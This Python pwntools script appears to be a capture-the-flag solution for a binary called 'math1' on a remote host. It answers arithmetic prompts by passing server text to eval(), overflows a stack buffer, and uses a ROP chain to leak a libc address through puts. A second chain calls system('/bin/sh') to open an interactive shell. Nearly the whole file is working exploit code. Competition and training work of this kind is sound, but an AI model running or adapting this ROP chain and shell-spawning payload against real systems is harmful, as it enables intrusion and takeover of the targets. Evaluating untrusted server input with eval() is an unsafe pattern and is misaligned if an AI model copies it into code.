from pwn import *

p = remote("104.199.120.115", 17073)
# p = process("./math1")

def trigger():
    # sleep(1)
    p.recvuntil(":)\n")

    for i in range(100):
        # sleep(1)
        prob = p.recv()[:-2]
        p.sendline(str(eval(prob)))

def exploit():
    binary = ELF("./math1")
    main = binary.symbols['main']
    strcmp_got = binary.got['puts']
    puts_plt = binary.plt['puts']
    pop_rdi = 0x000000000040186b
    pop_rsi_r15 = 0x0000000000401869
    ret = 0x0000000000401016

    # sleep(1)
    trigger()

    payload = ''
    payload += 'A' * 0x108
    payload += p64(pop_rdi)
    payload += p64(strcmp_got)
    payload += p64(puts_plt)
    payload += p64(main)

    # gdb.attach(p)
    p.sendline(payload)

    p.recvuntil("> ")
    libc_leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x00000000000875a0
    log.info("Libc base : {}".format(hex(libc_base)))
    libc_system = libc_base + 0x0000000000055410
    log.info("Libc system : {}".format(hex(libc_system)))
    libc_binsh = libc_base + 0x1b75aa
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))
    # one_gadget = libc_base + 0xd6c3d
    # log.info("One gadget : {}".format(hex(one_gadget)))

    trigger()
    
    payload = ''
    payload += 'A' * 0x108
    # payload += p64(one_gadget)
    payload += p64(pop_rdi)
    payload += p64(libc_binsh)
    payload += p64(pop_rsi_r15)
    payload += p64(0) * 2
    payload += p64(libc_system)

    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()